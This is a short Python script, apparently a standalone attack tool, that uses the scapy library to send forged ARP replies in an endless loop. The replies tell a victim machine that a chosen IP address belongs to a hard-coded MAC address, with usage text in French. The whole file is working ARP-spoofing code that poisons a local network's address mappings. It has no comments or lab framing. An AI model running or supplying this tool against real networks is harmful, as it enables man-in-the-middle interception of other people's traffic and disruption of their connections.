from scapy.all import ARP, send
import sys
import time

def arpSpoof(victimIp, spoofIp):
    while True:
        arpResponse = ARP(op=2, pdst=victimIp, psrc=spoofIp, hwsrc="08:00:27:1e:36:4a")
        send(arpResponse, iface="eth0", verbose=1)
        time.sleep(2)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Utilisation : sudo python3 arp_spoof.py [IP victime] [IP spoof]")
        sys.exit(1)

    victimIp = sys.argv[1]
    spoofIp = sys.argv[2]

    arpSpoof(victimIp, spoofIp)
